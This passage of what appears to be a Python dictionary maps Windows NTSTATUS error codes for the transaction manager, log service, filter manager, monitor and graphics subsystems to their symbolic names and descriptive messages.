		0xC0190051: ("STATUS_TRANSACTIONMANAGER_NOT_FOUND","The specified transaction manager was unable to be opened because it was not found."),
		0xC0190052: ("STATUS_TRANSACTIONMANAGER_NOT_ONLINE","The specified resource manager was unable to create an enlistment because its associated transaction manager is not online."),
		0xC0190053: ("STATUS_TRANSACTIONMANAGER_RECOVERY_NAME_COLLISION","The specified transaction manager was unable to create the objects contained in its log file in the Ob namespace. Therefore, the transaction manager was unable to recover."),
		0xC0190054: ("STATUS_TRANSACTION_NOT_ROOT","The call to create a superior enlistment on this transaction object could not be completed because the transaction object specified for the enlistment is a subordinate branch of the transaction. Only the root of the transaction can be enlisted as a superior."),
		0xC0190055: ("STATUS_TRANSACTION_OBJECT_EXPIRED","Because the associated transaction manager or resource manager has been closed, the handle is no longer valid."),
		0xC0190056: ("STATUS_COMPRESSION_NOT_ALLOWED_IN_TRANSACTION","The compression operation could not be completed because a transaction is active on the file."),
		0xC0190057: ("STATUS_TRANSACTION_RESPONSE_NOT_ENLISTED","The specified operation could not be performed on this superior enlistment because the enlistment was not created with the corresponding completion response in the NotificationMask."),
		0xC0190058: ("STATUS_TRANSACTION_RECORD_TOO_LONG","The specified operation could not be performed because the record to be logged was too long. This can occur because either there are too many enlistments on this transaction or the combined RecoveryInformation being logged on behalf of those enlistments is too long."),
		0xC0190059: ("STATUS_NO_LINK_TRACKING_IN_TRANSACTION","The link-tracking operation could not be completed because a transaction is active."),
		0xC019005A: ("STATUS_OPERATION_NOT_SUPPORTED_IN_TRANSACTION","This operation cannot be performed in a transaction."),
		0xC019005B: ("STATUS_TRANSACTION_INTEGRITY_VIOLATED","The kernel transaction manager had to abort or forget the transaction because it blocked forward progress."),
		0xC0190060: ("STATUS_EXPIRED_HANDLE","The handle is no longer properly associated with its transaction. It may have been opened in a transactional resource manager that was subsequently forced to restart. Please close the handle and open a new one."),
		0xC0190061: ("STATUS_TRANSACTION_NOT_ENLISTED","The specified operation could not be performed because the resource manager is not enlisted in the transaction."),
		0xC01A0001: ("STATUS_LOG_SECTOR_INVALID","The log service found an invalid log sector."),
		0xC01A0002: ("STATUS_LOG_SECTOR_PARITY_INVALID","The log service encountered a log sector with invalid block parity."),
		0xC01A0003: ("STATUS_LOG_SECTOR_REMAPPED","The log service encountered a remapped log sector."),
		0xC01A0004: ("STATUS_LOG_BLOCK_INCOMPLETE","The log service encountered a partial or incomplete log block."),
		0xC01A0005: ("STATUS_LOG_INVALID_RANGE","The log service encountered an attempt to access data outside the active log range."),
		0xC01A0006: ("STATUS_LOG_BLOCKS_EXHAUSTED","The log service user-log marshaling buffers are exhausted."),
		0xC01A0007: ("STATUS_LOG_READ_CONTEXT_INVALID","The log service encountered an attempt to read from a marshaling area with an invalid read context."),
		0xC01A0008: ("STATUS_LOG_RESTART_INVALID","The log service encountered an invalid log restart area."),
		0xC01A0009: ("STATUS_LOG_BLOCK_VERSION","The log service encountered an invalid log block version."),
		0xC01A000A: ("STATUS_LOG_BLOCK_INVALID","The log service encountered an invalid log block."),
		0xC01A000B: ("STATUS_LOG_READ_MODE_INVALID","The log service encountered an attempt to read the log with an invalid read mode."),
		0xC01A000D: ("STATUS_LOG_METADATA_CORRUPT","The log service encountered a corrupted metadata file."),
		0xC01A000E: ("STATUS_LOG_METADATA_INVALID","The log service encountered a metadata file that could not be created by the log file system."),
		0xC01A000F: ("STATUS_LOG_METADATA_INCONSISTENT","The log service encountered a metadata file with inconsistent data."),
		0xC01A0010: ("STATUS_LOG_RESERVATION_INVALID","The log service encountered an attempt to erroneously allocate or dispose reservation space."),
		0xC01A0011: ("STATUS_LOG_CANT_DELETE","The log service cannot delete the log file or the file system container."),
		0xC01A0012: ("STATUS_LOG_CONTAINER_LIMIT_EXCEEDED","The log service has reached the maximum allowable containers allocated to a log file."),
		0xC01A0013: ("STATUS_LOG_START_OF_LOG","The log service has attempted to read or write backward past the start of the log."),
		0xC01A0014: ("STATUS_LOG_POLICY_ALREADY_INSTALLED","The log policy could not be installed because a policy of the same type is already present."),
		0xC01A0015: ("STATUS_LOG_POLICY_NOT_INSTALLED","The log policy in question was not installed at the time of the request."),
		0xC01A0016: ("STATUS_LOG_POLICY_INVALID","The installed set of policies on the log is invalid."),
		0xC01A0017: ("STATUS_LOG_POLICY_CONFLICT","A policy on the log in question prevented the operation from completing."),
		0xC01A0018: ("STATUS_LOG_PINNED_ARCHIVE_TAIL","The log space cannot be reclaimed because the log is pinned by the archive tail."),
		0xC01A0019: ("STATUS_LOG_RECORD_NONEXISTENT","The log record is not a record in the log file."),
		0xC01A001A: ("STATUS_LOG_RECORDS_RESERVED_INVALID","The number of reserved log records or the adjustment of the number of reserved log records is invalid."),
		0xC01A001B: ("STATUS_LOG_SPACE_RESERVED_INVALID","The reserved log space or the adjustment of the log space is invalid."),
		0xC01A001C: ("STATUS_LOG_TAIL_INVALID","A new or existing archive tail or the base of the active log is invalid."),
		0xC01A001D: ("STATUS_LOG_FULL","The log space is exhausted."),
		0xC01A001E: ("STATUS_LOG_MULTIPLEXED","The log is multiplexed; no direct writes to the physical log are allowed."),
		0xC01A001F: ("STATUS_LOG_DEDICATED","The operation failed because the log is dedicated."),
		0xC01A0020: ("STATUS_LOG_ARCHIVE_NOT_IN_PROGRESS","The operation requires an archive context."),
		0xC01A0021: ("STATUS_LOG_ARCHIVE_IN_PROGRESS","Log archival is in progress."),
		0xC01A0022: ("STATUS_LOG_EPHEMERAL","The operation requires a nonephemeral log, but the log is ephemeral."),
		0xC01A0023: ("STATUS_LOG_NOT_ENOUGH_CONTAINERS","The log must have at least two containers before it can be read from or written to."),
		0xC01A0024: ("STATUS_LOG_CLIENT_ALREADY_REGISTERED","A log client has already registered on the stream."),
		0xC01A0025: ("STATUS_LOG_CLIENT_NOT_REGISTERED","A log client has not been registered on the stream."),
		0xC01A0026: ("STATUS_LOG_FULL_HANDLER_IN_PROGRESS","A request has already been made to handle the log full condition."),
		0xC01A0027: ("STATUS_LOG_CONTAINER_READ_FAILED","The log service encountered an error when attempting to read from a log container."),
		0xC01A0028: ("STATUS_LOG_CONTAINER_WRITE_FAILED","The log service encountered an error when attempting to write to a log container."),
		0xC01A0029: ("STATUS_LOG_CONTAINER_OPEN_FAILED","The log service encountered an error when attempting to open a log container."),
		0xC01A002A: ("STATUS_LOG_CONTAINER_STATE_INVALID","The log service encountered an invalid container state when attempting a requested action."),
		0xC01A002B: ("STATUS_LOG_STATE_INVALID","The log service is not in the correct state to perform a requested action."),
		0xC01A002C: ("STATUS_LOG_PINNED","The log space cannot be reclaimed because the log is pinned."),
		0xC01A002D: ("STATUS_LOG_METADATA_FLUSH_FAILED","The log metadata flush failed."),
		0xC01A002E: ("STATUS_LOG_INCONSISTENT_SECURITY","Security on the log and its containers is inconsistent."),
		0xC01A002F: ("STATUS_LOG_APPENDED_FLUSH_FAILED","Records were appended to the log or reservation changes were made, but the log could not be flushed."),
		0xC01A0030: ("STATUS_LOG_PINNED_RESERVATION","The log is pinned due to reservation consuming most of the log space. Free some reserved records to make space available."),
		0xC01B00EA: ("STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD","{Display Driver Stopped Responding} The %hs display driver has stopped working normally. Save your work and reboot the system to restore full display functionality. The next time you reboot the computer, a dialog box will allow you to upload data about this failure to Microsoft."),
		0xC01C0001: ("STATUS_FLT_NO_HANDLER_DEFINED","A handler was not defined by the filter for this operation."),
		0xC01C0002: ("STATUS_FLT_CONTEXT_ALREADY_DEFINED","A context is already defined for this object."),
		0xC01C0003: ("STATUS_FLT_INVALID_ASYNCHRONOUS_REQUEST","Asynchronous requests are not valid for this operation."),
		0xC01C0004: ("STATUS_FLT_DISALLOW_FAST_IO","This is an internal error code used by the filter manager to determine if a fast I/O operation should be forced down the input/output request packet (IRP) path. Minifilters should never return this value."),
		0xC01C0005: ("STATUS_FLT_INVALID_NAME_REQUEST","An invalid name request was made. The name requested cannot be retrieved at this time."),
		0xC01C0006: ("STATUS_FLT_NOT_SAFE_TO_POST_OPERATION","Posting this operation to a worker thread for further processing is not safe at this time because it could lead to a system deadlock."),
		0xC01C0007: ("STATUS_FLT_NOT_INITIALIZED","The Filter Manager was not initialized when a filter tried to register. Make sure that the Filter Manager is loaded as a driver."),
		0xC01C0008: ("STATUS_FLT_FILTER_NOT_READY","The filter is not ready for attachment to volumes because it has not finished initializing (FltStartFiltering has not been called)."),
		0xC01C0009: ("STATUS_FLT_POST_OPERATION_CLEANUP","The filter must clean up any operation-specific context at this time because it is being removed from the system before the operation is completed by the lower drivers."),
		0xC01C000A: ("STATUS_FLT_INTERNAL_ERROR","The Filter Manager had an internal error from which it cannot recover; therefore, the operation has failed. This is usually the result of a filter returning an invalid value from a pre-operation callback."),
		0xC01C000B: ("STATUS_FLT_DELETING_OBJECT","The object specified for this action is in the process of being deleted; therefore, the action requested cannot be completed at this time."),
		0xC01C000C: ("STATUS_FLT_MUST_BE_NONPAGED_POOL","A nonpaged pool must be used for this type of context."),
		0xC01C000D: ("STATUS_FLT_DUPLICATE_ENTRY","A duplicate handler definition has been provided for an operation."),
		0xC01C000E: ("STATUS_FLT_CBDQ_DISABLED","The callback data queue has been disabled."),
		0xC01C000F: ("STATUS_FLT_DO_NOT_ATTACH","Do not attach the filter to the volume at this time."),
		0xC01C0010: ("STATUS_FLT_DO_NOT_DETACH","Do not detach the filter from the volume at this time."),
		0xC01C0011: ("STATUS_FLT_INSTANCE_ALTITUDE_COLLISION","An instance already exists at this altitude on the volume specified."),
		0xC01C0012: ("STATUS_FLT_INSTANCE_NAME_COLLISION","An instance already exists with this name on the volume specified."),
		0xC01C0013: ("STATUS_FLT_FILTER_NOT_FOUND","The system could not find the filter specified."),
		0xC01C0014: ("STATUS_FLT_VOLUME_NOT_FOUND","The system could not find the volume specified."),
		0xC01C0015: ("STATUS_FLT_INSTANCE_NOT_FOUND","The system could not find the instance specified."),
		0xC01C0016: ("STATUS_FLT_CONTEXT_ALLOCATION_NOT_FOUND","No registered context allocation definition was found for the given request."),
		0xC01C0017: ("STATUS_FLT_INVALID_CONTEXT_REGISTRATION","An invalid parameter was specified during context registration."),
		0xC01C0018: ("STATUS_FLT_NAME_CACHE_MISS","The name requested was not found in the Filter Manager name cache and could not be retrieved from the file system."),
		0xC01C0019: ("STATUS_FLT_NO_DEVICE_OBJECT","The requested device object does not exist for the given volume."),
		0xC01C001A: ("STATUS_FLT_VOLUME_ALREADY_MOUNTED","The specified volume is already mounted."),
		0xC01C001B: ("STATUS_FLT_ALREADY_ENLISTED","The specified transaction context is already enlisted in a transaction."),
		0xC01C001C: ("STATUS_FLT_CONTEXT_ALREADY_LINKED","The specified context is already attached to another object."),
		0xC01C0020: ("STATUS_FLT_NO_WAITER_FOR_REPLY","No waiter is present for the filter's reply to this message."),
		0xC01D0001: ("STATUS_MONITOR_NO_DESCRIPTOR","A monitor descriptor could not be obtained."),
		0xC01D0002: ("STATUS_MONITOR_UNKNOWN_DESCRIPTOR_FORMAT","This release does not support the format of the obtained monitor descriptor."),
		0xC01D0003: ("STATUS_MONITOR_INVALID_DESCRIPTOR_CHECKSUM","The checksum of the obtained monitor descriptor is invalid."),
		0xC01D0004: ("STATUS_MONITOR_INVALID_STANDARD_TIMING_BLOCK","The monitor descriptor contains an invalid standard timing block."),
		0xC01D0005: ("STATUS_MONITOR_WMI_DATABLOCK_REGISTRATION_FAILED","WMI data-block registration failed for one of the MSMonitorClass WMI subclasses."),
		0xC01D0006: ("STATUS_MONITOR_INVALID_SERIAL_NUMBER_MONDSC_BLOCK","The provided monitor descriptor block is either corrupted or does not contain the monitor's detailed serial number."),
		0xC01D0007: ("STATUS_MONITOR_INVALID_USER_FRIENDLY_MONDSC_BLOCK","The provided monitor descriptor block is either corrupted or does not contain the monitor's user-friendly name."),
		0xC01D0008: ("STATUS_MONITOR_NO_MORE_DESCRIPTOR_DATA","There is no monitor descriptor data at the specified (offset or size) region."),
		0xC01D0009: ("STATUS_MONITOR_INVALID_DETAILED_TIMING_BLOCK","The monitor descriptor contains an invalid detailed timing block."),
		0xC01D000A: ("STATUS_MONITOR_INVALID_MANUFACTURE_DATE","Monitor descriptor contains invalid manufacture date."),
		0xC01E0000: ("STATUS_GRAPHICS_NOT_EXCLUSIVE_MODE_OWNER","Exclusive mode ownership is needed to create an unmanaged primary allocation."),
		0xC01E0001: ("STATUS_GRAPHICS_INSUFFICIENT_DMA_BUFFER","The driver needs more DMA buffer space to complete the requested operation."),
		0xC01E0002: ("STATUS_GRAPHICS_INVALID_DISPLAY_ADAPTER","The specified display adapter handle is invalid."),
		0xC01E0003: ("STATUS_GRAPHICS_ADAPTER_WAS_RESET","The specified display adapter and all of its state have been reset."),
		0xC01E0004: ("STATUS_GRAPHICS_INVALID_DRIVER_MODEL","The driver stack does not match the expected driver model."),
		0xC01E0005: ("STATUS_GRAPHICS_PRESENT_MODE_CHANGED","Present happened but ended up into the changed desktop mode."),
		0xC01E0006: ("STATUS_GRAPHICS_PRESENT_OCCLUDED","Nothing to present due to desktop occlusion."),
		0xC01E0007: ("STATUS_GRAPHICS_PRESENT_DENIED","Not able to present due to denial of desktop access."),
		0xC01E0008: ("STATUS_GRAPHICS_CANNOTCOLORCONVERT","Not able to present with color conversion."),
		0xC01E000B: ("STATUS_GRAPHICS_PRESENT_REDIRECTION_DISABLED","Present redirection is disabled (desktop windowing management subsystem is off)."),
		0xC01E000C: ("STATUS_GRAPHICS_PRESENT_UNOCCLUDED","Previous exclusive VidPn source owner has released its ownership"),
		0xC01E0100: ("STATUS_GRAPHICS_NO_VIDEO_MEMORY","Not enough video memory is available to complete the operation."),
		0xC01E0101: ("STATUS_GRAPHICS_CANT_LOCK_MEMORY","Could not probe and lock the underlying memory of an allocation."),
		0xC01E0102: ("STATUS_GRAPHICS_ALLOCATION_BUSY","The allocation is currently busy."),
		0xC01E0103: ("STATUS_GRAPHICS_TOO_MANY_REFERENCES","An object being referenced has already reached the maximum reference count and cannot be referenced further."),
		0xC01E0104: ("STATUS_GRAPHICS_TRY_AGAIN_LATER","A problem could not be solved due to an existing condition. Try again later."),
		0xC01E0105: ("STATUS_GRAPHICS_TRY_AGAIN_NOW","A problem could not be solved due to an existing condition. Try again now."),
		0xC01E0106: ("STATUS_GRAPHICS_ALLOCATION_INVALID","The allocation is invalid."),
		0xC01E0107: ("STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNAVAILABLE","No more unswizzling apertures are currently available."),
		0xC01E0108: ("STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNSUPPORTED","The current allocation cannot be unswizzled by an aperture."),
		0xC01E0109: ("STATUS_GRAPHICS_CANT_EVICT_PINNED_ALLOCATION","The request failed because a pinned allocation cannot be evicted."),
		0xC01E0110: ("STATUS_GRAPHICS_INVALID_ALLOCATION_USAGE","The allocation cannot be used from its current segment location for the specified operation."),
		0xC01E0111: ("STATUS_GRAPHICS_CANT_RENDER_LOCKED_ALLOCATION","A locked allocation cannot be used in the current command buffer."),
		0xC01E0112: ("STATUS_GRAPHICS_ALLOCATION_CLOSED","The allocation being referenced has been closed permanently."),
		0xC01E0113: ("STATUS_GRAPHICS_INVALID_ALLOCATION_INSTANCE","An invalid allocation instance is being referenced."),
		0xC01E0114: ("STATUS_GRAPHICS_INVALID_ALLOCATION_HANDLE","An invalid allocation handle is being referenced."),
		0xC01E0115: ("STATUS_GRAPHICS_WRONG_ALLOCATION_DEVICE","The allocation being referenced does not belong to the current device."),
		0xC01E0116: ("STATUS_GRAPHICS_ALLOCATION_CONTENT_LOST","The specified allocation lost its content."),
		0xC01E0200: ("STATUS_GRAPHICS_GPU_EXCEPTION_ON_DEVICE","A GPU exception was detected on the given device. The device cannot be scheduled."),
		0xC01E0300: ("STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY","The specified VidPN topology is invalid."),
		0xC01E0301: ("STATUS_GRAPHICS_VIDPN_TOPOLOGY_NOT_SUPPORTED","The specified VidPN topology is valid but is not supported by this model of the display adapter."),
		0xC01E0302: ("STATUS_GRAPHICS_VIDPN_TOPOLOGY_CURRENTLY_NOT_SUPPORTED","The specified VidPN topology is valid but is not currently supported by the display adapter due to allocation of its resources."),
		0xC01E0303: ("STATUS_GRAPHICS_INVALID_VIDPN","The specified VidPN handle is invalid."),
		0xC01E0304: ("STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE","The specified video present source is invalid."),
		0xC01E0305: ("STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET","The specified video present target is invalid."),
		0xC01E0306: ("STATUS_GRAPHICS_VIDPN_MODALITY_NOT_SUPPORTED","The specified VidPN modality is not supported (for example, at least two of the pinned modes are not co-functional)."),
		0xC01E0308: ("STATUS_GRAPHICS_INVALID_VIDPN_SOURCEMODESET","The specified VidPN source mode set is invalid."),
		0xC01E0309: ("STATUS_GRAPHICS_INVALID_VIDPN_TARGETMODESET","The specified VidPN target mode set is invalid."),
		0xC01E030A: ("STATUS_GRAPHICS_INVALID_FREQUENCY","The specified video signal frequency is invalid."),
		0xC01E030B: ("STATUS_GRAPHICS_INVALID_ACTIVE_REGION","The specified video signal active region is invalid."),
		0xC01E030C: ("STATUS_GRAPHICS_INVALID_TOTAL_REGION","The specified video signal total region is invalid."),
		0xC01E0310: ("STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE_MODE","The specified video present source mode is invalid."),
		0xC01E0311: ("STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET_MODE","The specified video present target mode is invalid."),
		0xC01E0312: ("STATUS_GRAPHICS_PINNED_MODE_MUST_REMAIN_IN_SET","The pinned mode must remain in the set on the VidPN's co-functional modality enumeration."),
		0xC01E0313: ("STATUS_GRAPHICS_PATH_ALREADY_IN_TOPOLOGY","The specified video present path is already in the VidPN's topology."),
		0xC01E0314: ("STATUS_GRAPHICS_MODE_ALREADY_IN_MODESET","The specified mode is already in the mode set."),
		0xC01E0315: ("STATUS_GRAPHICS_INVALID_VIDEOPRESENTSOURCESET","The specified video present source set is invalid."),
		0xC01E0316: ("STATUS_GRAPHICS_INVALID_VIDEOPRESENTTARGETSET","The specified video present target set is invalid."),
		0xC01E0317: ("STATUS_GRAPHICS_SOURCE_ALREADY_IN_SET","The specified video present source is already in the video present source set."),
		0xC01E0318: ("STATUS_GRAPHICS_TARGET_ALREADY_IN_SET","The specified video present target is already in the video present target set."),
		0xC01E0319: ("STATUS_GRAPHICS_INVALID_VIDPN_PRESENT_PATH","The specified VidPN present path is invalid."),
		0xC01E031A: ("STATUS_GRAPHICS_NO_RECOMMENDED_VIDPN_TOPOLOGY","The miniport has no recommendation for augmenting the specified VidPN's topology."),
		0xC01E031B: ("STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGESET","The specified monitor frequency range set is invalid."),
		0xC01E031C: ("STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE","The specified monitor frequency range is invalid."),
		0xC01E031D: ("STATUS_GRAPHICS_FREQUENCYRANGE_NOT_IN_SET","The specified frequency range is not in the specified monitor frequency range set."),
		0xC01E031F: ("STATUS_GRAPHICS_FREQUENCYRANGE_ALREADY_IN_SET","The specified frequency range is already in the specified monitor frequency range set."),
		0xC01E0320: ("STATUS_GRAPHICS_STALE_MODESET","The specified mode set is stale. Reacquire the new mode set."),
		0xC01E0321: ("STATUS_GRAPHICS_INVALID_MONITOR_SOURCEMODESET","The specified monitor source mode set is invalid."),
		0xC01E0322: ("STATUS_GRAPHICS_INVALID_MONITOR_SOURCE_MODE","The specified monitor source mode is invalid."),
		0xC01E0323: ("STATUS_GRAPHICS_NO_RECOMMENDED_FUNCTIONAL_VIDPN","The miniport does not have a recommendation regarding the request to provide a functional VidPN given the current display adapter configuration."),
		0xC01E0324: ("STATUS_GRAPHICS_MODE_ID_MUST_BE_UNIQUE","The ID of the specified mode is being used by another mode in the set."),
		0xC01E0325: ("STATUS_GRAPHICS_EMPTY_ADAPTER_MONITOR_MODE_SUPPORT_INTERSECTION","The system failed to determine a mode that is supported by both the display adapter and the monitor connected to it."),
		0xC01E0326: ("STATUS_GRAPHICS_VIDEO_PRESENT_TARGETS_LESS_THAN_SOURCES","The number of video present targets must be greater than or equal to the number of video present sources."),
		0xC01E0327: ("STATUS_GRAPHICS_PATH_NOT_IN_TOPOLOGY","The specified present path is not in the VidPN's topology."),
		0xC01E0328: ("STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_SOURCE","The display adapter must have at least one video present source."),
		0xC01E0329: ("STATUS_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_TARGET","The display adapter must have at least one video present target."),
		0xC01E032A: ("STATUS_GRAPHICS_INVALID_MONITORDESCRIPTORSET","The specified monitor descriptor set is invalid."),
		0xC01E032B: ("STATUS_GRAPHICS_INVALID_MONITORDESCRIPTOR","The specified monitor descriptor is invalid."),
		0xC01E032C: ("STATUS_GRAPHICS_MONITORDESCRIPTOR_NOT_IN_SET","The specified descriptor is not in the specified monitor descriptor set."),
		0xC01E032D: ("STATUS_GRAPHICS_MONITORDESCRIPTOR_ALREADY_IN_SET","The specified descriptor is already in the specified monitor descriptor set."),
		0xC01E032E: ("STATUS_GRAPHICS_MONITORDESCRIPTOR_ID_MUST_BE_UNIQUE","The ID of the specified monitor descriptor is being used by another descriptor in the set."),
		0xC01E032F: ("STATUS_GRAPHICS_INVALID_VIDPN_TARGET_SUBSET_TYPE","The specified video present target subset type is invalid."),
		0xC01E0330: ("STATUS_GRAPHICS_RESOURCES_NOT_RELATED","Two or more of the specified resources are not related to each other, as defined by the interface semantics."),
		0xC01E0331: ("STATUS_GRAPHICS_SOURCE_ID_MUST_BE_UNIQUE","The ID of the specified video present source is being used by another source in the set."),
		0xC01E0332: ("STATUS_GRAPHICS_TARGET_ID_MUST_BE_UNIQUE","The ID of the specified video present target is being used by another target in the set."),
		0xC01E0333: ("STATUS_GRAPHICS_NO_AVAILABLE_VIDPN_TARGET","The specified VidPN source cannot be used because there is no available VidPN target to connect it to."),
		0xC01E0334: ("STATUS_GRAPHICS_MONITOR_COULD_NOT_BE_ASSOCIATED_WITH_ADAPTER","The newly arrived monitor could not be associated with a display adapter."),
		0xC01E0335: ("STATUS_GRAPHICS_NO_VIDPNMGR","The particular display adapter does not have an associated VidPN manager."),
		0xC01E0336: ("STATUS_GRAPHICS_NO_ACTIVE_VIDPN","The VidPN manager of the particular display adapter does not have an active VidPN."),
		0xC01E0337: ("STATUS_GRAPHICS_STALE_VIDPN_TOPOLOGY","The specified VidPN topology is stale; obtain the new topology."),
		0xC01E0338: ("STATUS_GRAPHICS_MONITOR_NOT_CONNECTED","No monitor is connected on the specified video present target."),
		0xC01E0339: ("STATUS_GRAPHICS_SOURCE_NOT_IN_TOPOLOGY","The specified source is not part of the specified VidPN's topology."),
		0xC01E033A: ("STATUS_GRAPHICS_INVALID_PRIMARYSURFACE_SIZE","The specified primary surface size is invalid."),
		0xC01E033B: ("STATUS_GRAPHICS_INVALID_VISIBLEREGION_SIZE","The specified visible region size is invalid."),
		0xC01E033C: ("STATUS_GRAPHICS_INVALID_STRIDE","The specified stride is invalid."),
		0xC01E033D: ("STATUS_GRAPHICS_INVALID_PIXELFORMAT","The specified pixel format is invalid."),
		0xC01E033E: ("STATUS_GRAPHICS_INVALID_COLORBASIS","The specified color basis is invalid."),
		0xC01E033F: ("STATUS_GRAPHICS_INVALID_PIXELVALUEACCESSMODE","The specified pixel value access mode is invalid."),
		0xC01E0340: ("STATUS_GRAPHICS_TARGET_NOT_IN_TOPOLOGY","The specified target is not part of the specified VidPN's topology."),
		0xC01E0341: ("STATUS_GRAPHICS_NO_DISPLAY_MODE_MANAGEMENT_SUPPORT","Failed to acquire the display mode management interface."),
		0xC01E0342: ("STATUS_GRAPHICS_VIDPN_SOURCE_IN_USE","The specified VidPN source is already owned by a DMM client and cannot be used until that client releases it."),
		0xC01E0343: ("STATUS_GRAPHICS_CANT_ACCESS_ACTIVE_VIDPN","The specified VidPN is active and cannot be accessed."),
		0xC01E0344: ("STATUS_GRAPHICS_INVALID_PATH_IMPORTANCE_ORDINAL","The specified VidPN's present path importance ordinal is invalid."),
		0xC01E0345: ("STATUS_GRAPHICS_INVALID_PATH_CONTENT_GEOMETRY_TRANSFORMATION","The specified VidPN's present path content geometry transformation is invalid."),
		0xC01E0346: ("STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_SUPPORTED","The specified content geometry transformation is not supported on the respective VidPN present path."),
		0xC01E0347: ("STATUS_GRAPHICS_INVALID_GAMMA_RAMP","The specified gamma ramp is invalid."),
		0xC01E0348: ("STATUS_GRAPHICS_GAMMA_RAMP_NOT_SUPPORTED","The specified gamma ramp is not supported on the respective VidPN present path."),
		0xC01E0349: ("STATUS_GRAPHICS_MULTISAMPLING_NOT_SUPPORTED","Multisampling is not supported on the respective VidPN present path."),
		0xC01E034A: ("STATUS_GRAPHICS_MODE_NOT_IN_MODESET","The specified mode is not in the specified mode set."),
		0xC01E034D: ("STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY_RECOMMENDATION_REASON","The specified VidPN topology recommendation reason is invalid."),
		0xC01E034E: ("STATUS_GRAPHICS_INVALID_PATH_CONTENT_TYPE","The specified VidPN present path content type is invalid."),
		0xC01E034F: ("STATUS_GRAPHICS_INVALID_COPYPROTECTION_TYPE","The specified VidPN present path copy protection type is invalid."),
		0xC01E0350: ("STATUS_GRAPHICS_UNASSIGNED_MODESET_ALREADY_EXISTS","Only one unassigned mode set can exist at any one time for a particular VidPN source or target."),
		0xC01E0352: ("STATUS_GRAPHICS_INVALID_SCANLINE_ORDERING","The specified scan line ordering type is invalid."),
		0xC01E0353: ("STATUS_GRAPHICS_TOPOLOGY_CHANGES_NOT_ALLOWED","The topology changes are not allowed for the specified VidPN."),
		0xC01E0354: ("STATUS_GRAPHICS_NO_AVAILABLE_IMPORTANCE_ORDINALS","All available importance ordinals are being used in the specified topology."),
		0xC01E0355: ("STATUS_GRAPHICS_INCOMPATIBLE_PRIVATE_FORMAT","The specified primary surface has a different private-format attribute than the current primary surface."),
		0xC01E0356: ("STATUS_GRAPHICS_INVALID_MODE_PRUNING_ALGORITHM","The specified mode-pruning algorithm is invalid."),
		0xC01E0357: ("STATUS_GRAPHICS_INVALID_MONITOR_CAPABILITY_ORIGIN","The specified monitor-capability origin is invalid."),
		0xC01E0358: ("STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE_CONSTRAINT","The specified monitor-frequency range constraint is invalid."),
		0xC01E0359: ("STATUS_GRAPHICS_MAX_NUM_PATHS_REACHED","The maximum supported number of present paths has been reached."),
		0xC01E035A: ("STATUS_GRAPHICS_CANCEL_VIDPN_TOPOLOGY_AUGMENTATION","The miniport requested that augmentation be canceled for the specified source of the specified VidPN's topology."),
		0xC01E035B: ("STATUS_GRAPHICS_INVALID_CLIENT_TYPE","The specified client type was not recognized."),
		0xC01E035C: ("STATUS_GRAPHICS_CLIENTVIDPN_NOT_SET","The client VidPN is not set on this adapter (for example, no user mode-initiated mode changes have taken place on this adapter)."),
		0xC01E0400: ("STATUS_GRAPHICS_SPECIFIED_CHILD_ALREADY_CONNECTED","The specified display adapter child device already has an external device connected to it."),
		0xC01E0401: ("STATUS_GRAPHICS_CHILD_DESCRIPTOR_NOT_SUPPORTED","The display adapter child device does not support reporting a descriptor."),
		0xC01E0430: ("STATUS_GRAPHICS_NOT_A_LINKED_ADAPTER","The display adapter is not linked to any other adapters."),
		0xC01E0431: ("STATUS_GRAPHICS_LEADLINK_NOT_ENUMERATED","The lead adapter in a linked configuration was not enumerated yet."),
		0xC01E0432: ("STATUS_GRAPHICS_CHAINLINKS_NOT_ENUMERATED","Some chain adapters in a linked configuration have not yet been enumerated."),
		0xC01E0433: ("STATUS_GRAPHICS_ADAPTER_CHAIN_NOT_READY","The chain of linked adapters is not ready to start because of an unknown failure."),
		0xC01E0434: ("STATUS_GRAPHICS_CHAINLINKS_NOT_STARTED","An attempt was made to start a lead link display adapter when the chain links had not yet started."),
		0xC01E0435: ("STATUS_GRAPHICS_CHAINLINKS_NOT_POWERED_ON","An attempt was made to turn on a lead link display adapter when the chain links were turned off."),
		0xC01E0436: ("STATUS_GRAPHICS_INCONSISTENT_DEVICE_LINK_STATE","The adapter link was found in an inconsistent state. Not all adapters are in an expected PNP/power state."),
		0xC01E0438: ("STATUS_GRAPHICS_NOT_POST_DEVICE_DRIVER","The driver trying to start is not the same as the driver for the posted display adapter."),
		0xC01E043B: ("STATUS_GRAPHICS_ADAPTER_ACCESS_NOT_EXCLUDED","An operation is being attempted that requires the display adapter to be in a quiescent state."),
		0xC01E0500: ("STATUS_GRAPHICS_OPM_NOT_SUPPORTED","The driver does not support OPM."),
		0xC01E0501: ("STATUS_GRAPHICS_COPP_NOT_SUPPORTED","The driver does not support COPP."),
		0xC01E0502: ("STATUS_GRAPHICS_UAB_NOT_SUPPORTED","The driver does not support UAB."),
		0xC01E0503: ("STATUS_GRAPHICS_OPM_INVALID_ENCRYPTED_PARAMETERS","The specified encrypted parameters are invalid."),
		0xC01E0504: ("STATUS_GRAPHICS_OPM_PARAMETER_ARRAY_TOO_SMALL","An array passed to a function cannot hold all of the data that the function wants to put in it."),
		0xC01E0505: ("STATUS_GRAPHICS_OPM_NO_PROTECTED_OUTPUTS_EXIST","The GDI display device passed to this function does not have any active protected outputs."),
		0xC01E0506: ("STATUS_GRAPHICS_PVP_NO_DISPLAY_DEVICE_CORRESPONDS_TO_NAME","The PVP cannot find an actual GDI display device that corresponds to the passed-in GDI display device name."),
